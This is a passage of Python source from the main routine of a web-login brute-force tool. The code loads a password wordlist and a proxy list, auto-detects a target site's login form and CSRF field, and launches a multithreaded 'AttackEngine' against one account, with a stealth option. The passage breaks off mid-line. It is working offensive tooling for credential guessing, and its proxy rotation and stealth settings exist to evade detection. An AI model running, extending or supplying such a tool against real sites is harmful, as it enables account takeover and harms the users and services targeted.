        self.setup_logging()

        # Print banner
        if not self.interactive:
            C.print_banner()

        logging.info(f"{C.bold(C.cyan('═' * 60))}")
        logging.info(f"{C.bold(f'Target: {self.config["url"]}')}")
        logging.info(f"{C.bold(f'User:   {self.config["email"]}')}")
        logging.info(f"{C.bold(C.cyan('═' * 60))}")

        # ── 1. Load wordlist ──
        passwords = self.load_wordlist()
        print()

        # ── 2. Load proxies ──
        self.proxy_manager = self.load_proxies()
        print()

        # ── 3. Detect login form ──
        logging.info(f"{C.cyan('▶ Detecting login form...')}")

        session = requests.Session()
        detector = UniversalFormDetector(session)

        form = detector.detect_from_url(self.config['url'])
        if not form:
            logging.error(f"{C.red('✗ Could not detect login form!')}")
            sys.exit(1)

        self.form = form
        print()

        # ── 4. Print form details ──
        logging.info(f"{C.green('✓ Form Details:')}")
        logging.info(f"  Action  : {C.cyan(form.action)}")
        logging.info(f"  Method  : {C.cyan(form.method)}")
        logging.info(f"  User    : {C.yellow(form.user_field)}")
        logging.info(f"  Pass    : {C.yellow(form.pass_field)}")
        logging.info(f"  Auth    : {C.magenta(form.auth_type)}")
        logging.info(f"  CSRF    : {C.green('Yes') if form.csrf_field else C.red('No')}")
        logging.info(f"  Hidden  : {len(form.hidden)} fields")
        print()

        # ── 5. Create attack engine ──
        engine = AttackEngine(
            target_url=self.config['url'],
            username=self.config['email'],
            form=form,
            threads=self.config['threads'],
            delay=self.config['delay'],
            stealth=self.config['stealth'],
            proxy_manager=self.proxy_manager,
        )

        # ── 6. Prepare (fetch CSRF, test connection) ──
        if not engine.prepare():
            logging.error(f"{C.red('✗ Attack preparation failed!')}")
            sys.exit(1)
        print()

        # ── 7. Run attack ──
        logging.info(f"{C.bold(C.green('═' * 60))}")
        logging.info(f"{C.bold(C.green('          ATTACK STARTING'))}")
        logging.info(f"{C.bold(C.green('═' * 60))}")
        logging.info(f"  Passwords: {C.yellow(len(passwords))}")
        logging.info(f"  Threads  : {C.yellow(self.config['threads'])}")
        logging.info(f"  Delay    : {C.yellow(self.config['delay'])}s")
        logging.info(f"  Stealth  : {C.green('Yes
